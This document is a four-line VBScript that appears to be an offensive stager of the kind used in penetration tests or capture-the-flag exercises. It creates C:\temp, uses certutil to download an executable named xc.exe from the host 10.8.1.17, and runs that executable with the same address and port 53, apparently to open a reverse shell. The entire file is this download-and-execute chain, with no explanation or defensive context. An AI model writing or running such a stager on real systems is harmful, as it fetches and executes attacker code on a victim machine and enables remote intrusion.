Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd.exe /c mkdir C:\temp"
oShell.run "cmd.exe /c certutil -urlcache -split -f http://10.8.1.17/xc.exe C:\temp\xc.exe"
oShell.run "cmd.exe /c C:\temp\xc.exe 10.8.1.17 53"
